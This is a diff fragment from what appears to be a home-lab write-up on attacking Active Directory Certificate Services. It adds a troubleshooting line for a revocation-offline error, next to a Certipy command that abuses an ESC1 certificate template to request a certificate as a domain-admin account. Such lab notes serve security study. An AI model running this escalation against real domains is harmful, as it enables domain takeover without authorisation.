@@ -292,6 +292,8 @@ Certipy v4.8.2 - by Oliver Lyak (ly4k)
 
 1. CRYPT_E_REVOCATION_OFFLINE - The revocation function was unable to check revocation because the revocation server was offline.
 
+Two fixes for this error, the first approach is to reboot the DC, the second approach is listed below.
+
 ```
 (Tools) ubuntu@ubuntu-virtual-machine:~/Documents/Tools$ certipy req -u g.white -k -no-pass -ca 'hacklab-WIN-8HPLF8PSHC1-CA' -target 'WIN-8HPLF8PSHC1.hacklab.local' -template ESC1-Vun1 -dc-ip 192.168.68.230 -ptt -upn 'da1@hacklab.local' -debug
 Certipy v4.8.2 - by Oliver Lyak (ly4k)
